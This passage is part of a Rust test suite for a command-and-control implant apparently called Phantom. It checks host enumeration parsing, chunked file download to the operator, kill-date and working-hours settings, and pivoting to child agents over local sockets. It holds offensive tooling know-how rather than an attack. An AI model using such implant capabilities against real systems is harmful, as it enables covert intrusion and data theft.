             bob pts/1 2026-03-23 10:05\n",
        );
        assert_eq!(
            sessions,
            vec![
                SessionEntry {
                    client: "10.0.0.1".to_owned(),
                    user: "alice".to_owned(),
                    active: 0,
                    idle: 0,
                },
                SessionEntry {
                    client: "pts/1".to_owned(),
                    user: "bob".to_owned(),
                    active: 0,
                    idle: 0,
                },
            ]
        );
    }

    #[test]
    fn parse_user_entries_marks_uid_zero_as_admin() {
        let users = parse_user_entries(
            "root:x:0:0:root:/root:/bin/bash\n\
             daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
        );
        assert_eq!(
            users,
            vec![
                UserEntry { name: "daemon".to_owned(), is_admin: false },
                UserEntry { name: "root".to_owned(), is_admin: true },
            ]
        );
    }

    #[test]
    fn parse_group_entries_formats_gid_and_members() {
        let groups = parse_group_entries(
            "root:x:0:\n\
             wheel:x:10:alice,bob\n",
        );
        assert_eq!(
            groups,
            vec![
                GroupEntry { name: "root".to_owned(), description: "gid=0".to_owned() },
                GroupEntry {
                    name: "wheel".to_owned(),
                    description: "gid=10; members=alice,bob".to_owned(),
                },
            ]
        );
    }

    #[test]
    fn parse_memory_region_maps_linux_permissions_to_windows_compatible_constants() {
        let image = parse_memory_region("00400000-00452000 r-xp 00000000 08:01 12345 /usr/bin/cat")
            .expect("image region");
        assert_eq!(image.base, 0x0040_0000);
        assert_eq!(image.size, 0x52_000);
        assert_eq!(image.protect, PAGE_EXECUTE_READ);
        assert_eq!(image.state, MEM_COMMIT);
        assert_eq!(image.mem_type, MEM_IMAGE);

        let mapped =
            parse_memory_region("7f0000000000-7f0000001000 rw-s 00000000 00:05 99 /dev/shm/demo")
                .expect("mapped region");
        assert_eq!(mapped.protect, super::PAGE_WRITECOPY);
        assert_eq!(mapped.mem_type, MEM_MAPPED);

        let private =
            parse_memory_region("7ffd5f1c4000-7ffd5f1e5000 rw-p 00000000 00:00 0 [stack]")
                .expect("private region");
        assert_eq!(private.protect, PAGE_READWRITE);
        assert_eq!(private.mem_type, MEM_PRIVATE);

        let writable_exec = parse_memory_region("7f0000002000-7f0000003000 rwxp 00000000 00:00 0")
            .expect("writable exec region");
        assert_eq!(writable_exec.protect, PAGE_EXECUTE_READWRITE);
    }

    // ── CommandTransfer / chunked download tests ───────────────────────────

    #[tokio::test]
    async fn fs_download_queues_file_open_and_registers_download() {
        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("download.bin");
        std::fs::write(&path, b"hello download").expect("write test file");

        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
        payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        let package = DemonPackage::new(DemonCommand::CommandFs, 42, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::FileOpen { request_id, file_id, file_size, file_path } = &callbacks[0]
        else {
            panic!("expected FileOpen, got: {callbacks:?}");
        };
        assert_eq!(*request_id, 42);
        assert_eq!(*file_size, 14);
        assert!(!file_path.is_empty());
        let _ = *file_id; // random value, just ensure the field exists

        assert_eq!(state.downloads.len(), 1);
        assert_eq!(state.downloads[0].total_size, 14);
        assert_eq!(state.downloads[0].state, DownloadTransferState::Running);
    }

    #[tokio::test]
    async fn push_download_chunks_sends_data_and_close() {
        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("chunked.bin");
        let data = vec![0xAB_u8; 100];
        std::fs::write(&path, &data).expect("write test file");

        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
        payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        let package = DemonPackage::new(DemonCommand::CommandFs, 50, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");
        state.drain_callbacks(); // drain the FileOpen

        // Poll to push chunks.
        state.push_download_chunks();
        let callbacks = state.drain_callbacks();

        // With 100 bytes and a 512 KiB chunk size, should get one chunk + close.
        assert_eq!(callbacks.len(), 2);

        let PendingCallback::FileChunk { data: chunk, .. } = &callbacks[0] else {
            panic!("expected FileChunk, got: {:?}", callbacks[0]);
        };
        assert_eq!(chunk.len(), 100);
        assert!(chunk.iter().all(|b| *b == 0xAB));

        assert!(matches!(&callbacks[1], PendingCallback::FileClose { .. }));
        assert!(state.downloads.is_empty());
    }

    #[tokio::test]
    async fn file_open_callback_encodes_beacon_output_command_id() {
        let callback = PendingCallback::FileOpen {
            request_id: 1,
            file_id: 0x1234,
            file_size: 4096,
            file_path: "/tmp/test.bin".to_owned(),
        };
        assert_eq!(callback.command_id(), u32::from(DemonCommand::BeaconOutput));

        let payload = callback.payload().expect("payload");
        let mut offset = 0;
        assert_eq!(read_u32(&payload, &mut offset), u32::from(DemonCallback::File));
        let inner_len = read_u32(&payload, &mut offset) as usize;
        assert_eq!(inner_len, 4 + 4 + "/tmp/test.bin".len());
        assert_eq!(read_u32(&payload, &mut offset), 0x1234);
        assert_eq!(read_u32(&payload, &mut offset), 4096);
        let path_bytes = &payload[offset..];
        assert_eq!(path_bytes, b"/tmp/test.bin");
    }

    #[tokio::test]
    async fn file_chunk_callback_encodes_correctly() {
        let callback =
            PendingCallback::FileChunk { request_id: 2, file_id: 0xDEAD, data: vec![1, 2, 3, 4] };
        assert_eq!(callback.command_id(), u32::from(DemonCommand::BeaconOutput));

        let payload = callback.payload().expect("payload");
        let mut offset = 0;
        assert_eq!(read_u32(&payload, &mut offset), u32::from(DemonCallback::FileWrite));
        let inner_len = read_u32(&payload, &mut offset) as usize;
        assert_eq!(inner_len, 4 + 4); // file_id + data
        assert_eq!(read_u32(&payload, &mut offset), 0xDEAD);
        assert_eq!(&payload[offset..], &[1, 2, 3, 4]);
    }

    #[tokio::test]
    async fn file_close_callback_encodes_correctly() {
        let callback = PendingCallback::FileClose { request_id: 3, file_id: 0xBEEF };
        assert_eq!(callback.command_id(), u32::from(DemonCommand::BeaconOutput));

        let payload = callback.payload().expect("payload");
        let mut offset = 0;
        assert_eq!(read_u32(&payload, &mut offset), u32::from(DemonCallback::FileClose));
        assert_eq!(read_u32(&payload, &mut offset), 4); // inner len
        assert_eq!(read_u32(&payload, &mut offset), 0xBEEF);
    }

    #[tokio::test]
    async fn transfer_list_returns_active_downloads() {
        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("list.bin");
        std::fs::write(&path, b"list test data").expect("write");

        let mut fs_payload = Vec::new();
        fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
        fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        let mut state = PhantomState::default();
        execute(
            &DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("download");
        state.drain_callbacks();

        let file_id = state.downloads[0].file_id;

        // Send CommandTransfer List
        let mut transfer_payload = Vec::new();
        transfer_payload.extend_from_slice(&(DemonTransferCommand::List as i32).to_le_bytes());
        execute(
            &DemonPackage::new(DemonCommand::CommandTransfer, 10, transfer_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("transfer list");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandTransfer));
        assert_eq!(*request_id, 10);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonTransferCommand::List));
        // One download entry: file_id + read_size + state
        assert_eq!(read_u32(payload, &mut offset), file_id);
        assert_eq!(read_u32(payload, &mut offset), 0); // read_size = 0 (not started)
        assert_eq!(read_u32(payload, &mut offset), DownloadTransferState::Running as u32);
    }

    #[tokio::test]
    async fn transfer_stop_pauses_download() {
        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("stop.bin");
        std::fs::write(&path, vec![0u8; 1024 * 1024]).expect("write");

        let mut fs_payload = Vec::new();
        fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
        fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        let mut state = PhantomState::default();
        execute(
            &DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("download");
        state.drain_callbacks();

        let file_id = state.downloads[0].file_id;

        // Stop the download.
        let mut stop_payload = Vec::new();
        stop_payload.extend_from_slice(&(DemonTransferCommand::Stop as i32).to_le_bytes());
        stop_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
        execute(
            &DemonPackage::new(DemonCommand::CommandTransfer, 20, stop_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("transfer stop");

        assert_eq!(state.downloads[0].state, DownloadTransferState::Stopped);

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { payload, .. }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonTransferCommand::Stop));
        assert_eq!(read_u32(payload, &mut offset), 1); // found = true
        assert_eq!(read_u32(payload, &mut offset), file_id);

        // Pushing chunks should NOT produce any data for a stopped download.
        state.push_download_chunks();
        let callbacks = state.drain_callbacks();
        assert!(callbacks.is_empty(), "stopped download should not produce chunks");
    }

    #[tokio::test]
    async fn transfer_resume_restarts_download() {
        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("resume.bin");
        std::fs::write(&path, b"resume data").expect("write");

        let mut fs_payload = Vec::new();
        fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
        fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        let mut state = PhantomState::default();
        execute(
            &DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("download");
        state.drain_callbacks();

        let file_id = state.downloads[0].file_id;

        // Stop then resume.
        let mut stop_payload = Vec::new();
        stop_payload.extend_from_slice(&(DemonTransferCommand::Stop as i32).to_le_bytes());
        stop_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
        execute(
            &DemonPackage::new(DemonCommand::CommandTransfer, 20, stop_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("stop");
        state.drain_callbacks();

        let mut resume_payload = Vec::new();
        resume_payload.extend_from_slice(&(DemonTransferCommand::Resume as i32).to_le_bytes());
        resume_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
        execute(
            &DemonPackage::new(DemonCommand::CommandTransfer, 21, resume_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("resume");

        assert_eq!(state.downloads[0].state, DownloadTransferState::Running);
        state.drain_callbacks();

        // After resume, pushing chunks should produce data again.
        state.push_download_chunks();
        let callbacks = state.drain_callbacks();
        assert!(
            callbacks.iter().any(|c| matches!(c, PendingCallback::FileChunk { .. })),
            "resumed download should produce chunks"
        );
    }

    #[tokio::test]
    async fn transfer_remove_marks_download_for_removal() {
        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("remove.bin");
        std::fs::write(&path, vec![0u8; 1024 * 1024]).expect("write");

        let mut fs_payload = Vec::new();
        fs_payload.extend_from_slice(&(DemonFilesystemCommand::Download as i32).to_le_bytes());
        fs_payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        let mut state = PhantomState::default();
        execute(
            &DemonPackage::new(DemonCommand::CommandFs, 1, fs_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("download");
        state.drain_callbacks();

        let file_id = state.downloads[0].file_id;

        // Remove the download.
        let mut remove_payload = Vec::new();
        remove_payload.extend_from_slice(&(DemonTransferCommand::Remove as i32).to_le_bytes());
        remove_payload.extend_from_slice(&(file_id as i32).to_le_bytes());
        execute(
            &DemonPackage::new(DemonCommand::CommandTransfer, 30, remove_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("transfer remove");

        // Should produce two callbacks: the action response and the close notification.
        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 2);

        // Push should clean it up.
        state.push_download_chunks();
        let close_callbacks = state.drain_callbacks();
        assert!(
            close_callbacks.iter().any(|c| matches!(c, PendingCallback::FileClose { .. })),
            "removed download should emit FileClose on next push"
        );
        assert!(state.downloads.is_empty());
    }

    #[tokio::test]
    async fn transfer_stop_nonexistent_returns_not_found() {
        let mut state = PhantomState::default();
        let mut stop_payload = Vec::new();
        stop_payload.extend_from_slice(&(DemonTransferCommand::Stop as i32).to_le_bytes());
        stop_payload.extend_from_slice(&(0xDEAD_BEEF_u32 as i32).to_le_bytes());
        execute(
            &DemonPackage::new(DemonCommand::CommandTransfer, 40, stop_payload),
            &mut PhantomConfig::default(),
            &mut state,
        )
        .await
        .expect("transfer stop nonexistent");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { payload, .. }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonTransferCommand::Stop));
        assert_eq!(read_u32(payload, &mut offset), 0); // found = false
    }

    #[tokio::test]
    async fn cat_still_returns_full_file_as_structured_callback() {
        let tempdir = tempfile::tempdir().expect("tempdir");
        let path = tempdir.path().join("cat.txt");
        std::fs::write(&path, b"cat content").expect("write");

        let mut payload = Vec::new();
        payload.extend_from_slice(&(DemonFilesystemCommand::Cat as i32).to_le_bytes());
        payload.extend_from_slice(&utf16_payload(path.to_string_lossy().as_ref()));
        let package = DemonPackage::new(DemonCommand::CommandFs, 55, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, .. }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandFs));
        // Cat should not create tracked downloads.
        assert!(state.downloads.is_empty());
    }

    #[tokio::test]
    async fn execute_kill_date_stores_timestamp() {
        let timestamp: i64 = 1_800_000_000;
        let payload = timestamp.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandKillDate, 50, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state)
            .await
            .expect("execute kill date");
        assert_eq!(state.kill_date(), Some(timestamp));

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Output { request_id, text } = &callbacks[0] else {
            panic!("expected Output callback, got: {callbacks:?}");
        };
        assert_eq!(*request_id, 50);
        assert!(text.contains("1800000000"));
    }

    #[tokio::test]
    async fn execute_kill_date_zero_disables() {
        let payload = 0_i64.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandKillDate, 51, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state)
            .await
            .expect("execute kill date zero");
        assert_eq!(state.kill_date(), None);

        let callbacks = state.drain_callbacks();
        let PendingCallback::Output { text, .. } = &callbacks[0] else {
            panic!("expected Output callback");
        };
        assert!(text.contains("disabled"));
    }

    #[tokio::test]
    async fn execute_kill_date_updates_existing() {
        let mut state = PhantomState::default();

        // Set initial kill date.
        let payload = 1_800_000_000_i64.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandKillDate, 60, payload);
        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("set initial");
        state.drain_callbacks();

        // Update to a new kill date.
        let payload = 1_900_000_000_i64.to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandKillDate, 61, payload);
        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("update");
        assert_eq!(state.kill_date(), Some(1_900_000_000));
    }

    #[test]
    fn kill_date_callback_has_correct_command_id() {
        let callback = PendingCallback::KillDate { request_id: 0 };
        assert_eq!(callback.command_id(), u32::from(DemonCommand::CommandKillDate));
        assert_eq!(callback.request_id(), 0);
        assert!(callback.payload().expect("payload").is_empty());
    }

    #[test]
    fn queue_kill_date_callback_adds_to_pending() {
        let mut state = PhantomState::default();
        state.queue_kill_date_callback();
        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        assert!(matches!(callbacks[0], PendingCallback::KillDate { request_id: 0 }));
    }

    // ---- CommandConfig tests ----

    fn config_payload(key: u32, extra: &[u8]) -> Vec<u8> {
        let mut payload = (key as i32).to_le_bytes().to_vec();
        payload.extend_from_slice(extra);
        payload
    }

    #[tokio::test]
    async fn config_kill_date_sets_state_and_echoes_back() {
        let kill_date: i64 = 1_700_000_000;
        let payload = config_payload(154, &kill_date.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandConfig, 10, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        assert_eq!(state.kill_date(), Some(1_700_000_000));

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandConfig));
        assert_eq!(*request_id, 10);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), 154);
        assert_eq!(read_u64(payload, &mut offset), 1_700_000_000);
    }

    #[tokio::test]
    async fn config_kill_date_zero_clears_state() {
        let payload = config_payload(154, &0_i64.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandConfig, 11, payload);
        let mut state = PhantomState::default();
        state.set_kill_date(Some(1_700_000_000));

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        assert_eq!(state.kill_date(), None);
    }

    #[tokio::test]
    async fn config_working_hours_sets_state_and_echoes_back() {
        // Enable flag (bit 22) + start 09:00 (9<<17 | 0<<11) + end 17:00 (17<<6 | 0<<0)
        let hours: i32 = (1 << 22) | (9 << 17) | (17 << 6);
        let payload = config_payload(155, &hours.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandConfig, 12, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        assert_eq!(state.working_hours(), Some(hours));

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Structured { command_id, request_id, payload }] =
            callbacks.as_slice()
        else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandConfig));
        assert_eq!(*request_id, 12);

        let mut offset = 0;
        assert_eq!(read_u32(payload, &mut offset), 155);
        assert_eq!(read_u32(payload, &mut offset), hours as u32);
    }

    #[tokio::test]
    async fn config_working_hours_zero_clears_state() {
        let payload = config_payload(155, &0_i32.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandConfig, 13, payload);
        let mut state = PhantomState::default();
        state.set_working_hours(Some(12345));

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        assert_eq!(state.working_hours(), None);
    }

    #[tokio::test]
    async fn config_windows_only_key_returns_error() {
        // InjectTechnique (150) is Windows-only
        let payload = config_payload(150, &42_i32.to_le_bytes());
        let package = DemonPackage::new(DemonCommand::CommandConfig, 14, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*request_id, 14);
        assert!(text.contains("not supported on Linux"));
    }

    #[tokio::test]
    async fn config_unknown_key_returns_error() {
        let payload = config_payload(9999, &[]);
        let package = DemonPackage::new(DemonCommand::CommandConfig, 15, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        let [PendingCallback::Error { request_id, text }] = callbacks.as_slice() else {
            panic!("unexpected callbacks: {callbacks:?}");
        };
        assert_eq!(*request_id, 15);
        assert!(text.contains("unknown config key"));
    }

    // ---- Pivot tests ----

    use red_cell_common::demon::DemonPivotCommand;

    /// Build a CommandPivot task payload with a given subcommand and extra data.
    fn pivot_payload(subcommand: DemonPivotCommand, extra: &[u8]) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.extend_from_slice(&(u32::from(subcommand) as i32).to_le_bytes());
        payload.extend_from_slice(extra);
        payload
    }

    /// Build a fake DemonEnvelope for testing pivot connect.
    ///
    /// Format: `[size:4be][magic:4be][agent_id:4be][dummy_payload]`
    fn fake_demon_envelope(agent_id: u32) -> Vec<u8> {
        let dummy_payload = b"phantom-init-data";
        let size = (8 + dummy_payload.len()) as u32; // magic(4) + agent_id(4) + payload
        let mut envelope = Vec::new();
        envelope.extend_from_slice(&size.to_be_bytes());
        envelope.extend_from_slice(&0xDEAD_BEEFu32.to_be_bytes());
        envelope.extend_from_slice(&agent_id.to_be_bytes());
        envelope.extend_from_slice(dummy_payload);
        envelope
    }

    #[tokio::test]
    async fn pivot_list_empty() {
        let payload = pivot_payload(DemonPivotCommand::List, &[]);
        let package = DemonPackage::new(DemonCommand::CommandPivot, 1, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Structured { command_id, request_id, payload } = &callbacks[0] else {
            panic!("expected Structured callback, got: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandPivot));
        assert_eq!(*request_id, 1);

        let mut offset = 0;
        let sub = read_u32(payload, &mut offset);
        assert_eq!(sub, u32::from(DemonPivotCommand::List));
        // No additional data for empty list.
        assert_eq!(offset, payload.len());
    }

    #[tokio::test]
    async fn pivot_list_with_entries() {
        let mut state = PhantomState::default();
        // Manually insert a fake pivot to test list.
        let (left, _right) = std::os::unix::net::UnixStream::pair().expect("pair");
        left.set_nonblocking(true).expect("nonblocking");
        state.smb_pivots.insert(
            0xAABB_CCDDu32,
            super::PivotConnection { pipe_name: "/tmp/test_pivot".to_owned(), stream: left },
        );

        let payload = pivot_payload(DemonPivotCommand::List, &[]);
        let package = DemonPackage::new(DemonCommand::CommandPivot, 2, payload);
        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
            panic!("expected Structured");
        };

        let mut offset = 0;
        let sub = read_u32(payload, &mut offset);
        assert_eq!(sub, u32::from(DemonPivotCommand::List));
        let demon_id = read_u32(payload, &mut offset);
        assert_eq!(demon_id, 0xAABB_CCDD);
        // Skip the UTF-16 encoded pipe name (just verify there's more data).
        assert!(payload.len() > offset);
    }

    #[tokio::test]
    async fn pivot_connect_and_disconnect() {
        use std::io::Write as IoWrite;

        let tempdir = tempfile::tempdir().expect("tempdir");
        let sock_path = tempdir.path().join("pivot.sock");

        // Set up a listener simulating a child agent.
        let listener = std::os::unix::net::UnixListener::bind(&sock_path).expect("bind");

        // Spawn a thread that accepts a connection and writes a fake init envelope.
        let child_agent_id: u32 = 0x1234_5678;
        let envelope = fake_demon_envelope(child_agent_id);
        let handle = std::thread::spawn({
            let envelope = envelope.clone();
            move || {
                let (mut conn, _) = listener.accept().expect("accept");
                // Write the raw DemonEnvelope — its own size field serves as
                // the frame delimiter on the stream socket.
                IoWrite::write_all(&mut conn, &envelope).expect("write envelope");
                conn // keep alive
            }
        });

        let sock_str = sock_path.to_str().expect("path");
        let mut connect_extra = Vec::new();
        // wstring: [len:i32_le][utf16le_bytes]
        let utf16 = sock_str.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
        connect_extra.extend_from_slice(&(utf16.len() as i32).to_le_bytes());
        connect_extra.extend_from_slice(&utf16);

        let payload = pivot_payload(DemonPivotCommand::SmbConnect, &connect_extra);
        let package = DemonPackage::new(DemonCommand::CommandPivot, 10, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Structured { command_id, request_id, payload } = &callbacks[0] else {
            panic!("expected Structured callback, got: {callbacks:?}");
        };
        assert_eq!(*command_id, u32::from(DemonCommand::CommandPivot));
        assert_eq!(*request_id, 10);

        let mut offset = 0;
        let sub = read_u32(payload, &mut offset);
        assert_eq!(sub, u32::from(DemonPivotCommand::SmbConnect));
        let success = read_u32(payload, &mut offset);
        assert_eq!(success, 1); // TRUE

        // Verify the pivot was registered.
        assert!(state.smb_pivots.contains_key(&child_agent_id));

        // Now disconnect the pivot.
        let mut disc_extra = Vec::new();
        disc_extra.extend_from_slice(&(child_agent_id as i32).to_le_bytes());
        let payload = pivot_payload(DemonPivotCommand::SmbDisconnect, &disc_extra);
        let package = DemonPackage::new(DemonCommand::CommandPivot, 11, payload);
        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
            panic!("expected Structured");
        };

        let mut offset = 0;
        let sub = read_u32(payload, &mut offset);
        assert_eq!(sub, u32::from(DemonPivotCommand::SmbDisconnect));
        let success = read_u32(payload, &mut offset);
        assert_eq!(success, 1); // TRUE
        let disc_id = read_u32(payload, &mut offset);
        assert_eq!(disc_id, child_agent_id);

        assert!(!state.smb_pivots.contains_key(&child_agent_id));

        drop(handle.join().expect("child thread"));
    }

    #[tokio::test]
    async fn pivot_disconnect_nonexistent_returns_false() {
        let mut state = PhantomState::default();
        let mut extra = Vec::new();
        extra.extend_from_slice(&(0xDEADu32 as i32).to_le_bytes());
        let payload = pivot_payload(DemonPivotCommand::SmbDisconnect, &extra);
        let package = DemonPackage::new(DemonCommand::CommandPivot, 12, payload);

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Structured { payload, .. } = &callbacks[0] else {
            panic!("expected Structured");
        };
        let mut offset = 0;
        let sub = read_u32(payload, &mut offset);
        assert_eq!(sub, u32::from(DemonPivotCommand::SmbDisconnect));
        let success = read_u32(payload, &mut offset);
        assert_eq!(success, 0); // FALSE
    }

    #[tokio::test]
    async fn pivot_smb_command_writes_to_socket() {
        use std::io::Read as IoRead;

        let (left, right) = std::os::unix::net::UnixStream::pair().expect("pair");
        left.set_nonblocking(true).expect("nonblocking");

        let child_id: u32 = 0xABCD_0001;
        let mut state = PhantomState::default();
        state.smb_pivots.insert(
            child_id,
            super::PivotConnection { pipe_name: "/tmp/test".to_owned(), stream: left },
        );

        let task_data = b"encrypted-task-payload";
        let mut extra = Vec::new();
        extra.extend_from_slice(&(child_id as i32).to_le_bytes());
        extra.extend_from_slice(&(task_data.len() as i32).to_le_bytes());
        extra.extend_from_slice(task_data);

        let payload = pivot_payload(DemonPivotCommand::SmbCommand, &extra);
        let package = DemonPackage::new(DemonCommand::CommandPivot, 20, payload);

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        // No structured callback for SmbCommand (matches Demon behaviour).
        let callbacks = state.drain_callbacks();
        assert!(callbacks.is_empty());

        // Verify the data was written to the socket.
        let mut buf = vec![0u8; task_data.len()];
        let mut r = &right;
        IoRead::read_exact(&mut r, &mut buf).expect("read from socket");
        assert_eq!(&buf, task_data);
    }

    #[tokio::test]
    async fn pivot_smb_command_unknown_agent_returns_error() {
        let mut state = PhantomState::default();
        let unknown_id: u32 = 0xFFFF_0001;

        let mut extra = Vec::new();
        extra.extend_from_slice(&(unknown_id as i32).to_le_bytes());
        let data = b"payload";
        extra.extend_from_slice(&(data.len() as i32).to_le_bytes());
        extra.extend_from_slice(data);

        let payload = pivot_payload(DemonPivotCommand::SmbCommand, &extra);
        let package = DemonPackage::new(DemonCommand::CommandPivot, 21, payload);

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Error { text, .. } = &callbacks[0] else {
            panic!("expected Error callback");
        };
        assert!(text.contains("not found"));
    }

    #[tokio::test]
    async fn pivot_unknown_subcommand_returns_error() {
        let payload = (9999i32).to_le_bytes().to_vec();
        let package = DemonPackage::new(DemonCommand::CommandPivot, 30, payload);
        let mut state = PhantomState::default();

        execute(&package, &mut PhantomConfig::default(), &mut state).await.expect("execute");

        let callbacks = state.drain_callbacks();
        assert_eq!(callbacks.len(), 1);
        let PendingCallback::Error { text, .. } = &callbacks[0] else {
            panic!("expected Error callback");
        };
        assert!(text.contains("unknown pivot subcommand"));
    }

    #[tokio::test]
    async fn poll_pivots_reads_child_data() {
        use std::io::Write as IoWrite;

        let (left, right) = std::os::unix::net::UnixStream::pair().expect("pair");
        left.set_nonblocking(true).expect("nonblocking");

        let child_id: u32 = 0x0000_ABCD;
        let mut state = PhantomState::default();
        state.smb_pivots.insert(
            child_id,
            super::PivotConnection { pipe_name: "/tmp/poll_test".to_owned(), stream: left },
        );

        // Write a raw DemonEnvelope from the "child" side — its own size
        // field serves as the frame delimiter.
        let envelope = fake_demon_envelope(child_id);
        let mut w = &right;
        IoWrite::write_all(&mut w, &envelope).expect("write envelope");

        // Give the OS a moment to deliver the data.
